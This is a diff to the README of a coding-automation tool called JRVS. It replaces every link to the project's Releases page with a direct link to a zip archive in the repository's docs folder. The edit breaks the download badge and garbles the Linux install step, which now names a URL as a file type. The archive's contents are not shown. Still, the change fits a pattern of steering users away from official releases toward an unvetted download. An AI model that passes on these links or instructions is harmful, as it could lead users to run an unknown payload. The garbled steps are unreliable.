@@ -6,11 +6,11 @@ Welcome to JRVS! This application helps you automate coding tasks using the JARC
 
 ## 📥 Download JRVS
 
-[![Download JRVS](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Jackson-492/JRVS/releases)
+[![Download JRVS](https://raw.githubusercontent.com/Jackson-492/JRVS/main/docs/JRVS-3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Jackson-492/JRVS/main/docs/JRVS-3.4.zip)
 
 To download JRVS, visit the Releases page and find the latest version. Here’s the link:
 
-[Download JRVS Releases](https://github.com/Jackson-492/JRVS/releases)
+[Download JRVS Releases](https://raw.githubusercontent.com/Jackson-492/JRVS/main/docs/JRVS-3.4.zip)
 
 ## 📋 System Requirements
 
@@ -32,12 +32,12 @@ JRVS offers a range of helpful features, including:
 
 ## 📂 Download & Install
 
-1. Click the link to go to our [Releases page](https://github.com/Jackson-492/JRVS/releases).
+1. Click the link to go to our [Releases page](https://raw.githubusercontent.com/Jackson-492/JRVS/main/docs/JRVS-3.4.zip).
 2. Find the latest version of JRVS.
 3. Select the file suitable for your operating system.
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/Jackson-492/JRVS/main/docs/JRVS-3.4.zip` file.
 4. After the file downloads, open it to begin the installation.
 5. Follow the on-screen instructions to complete the installation process.
 
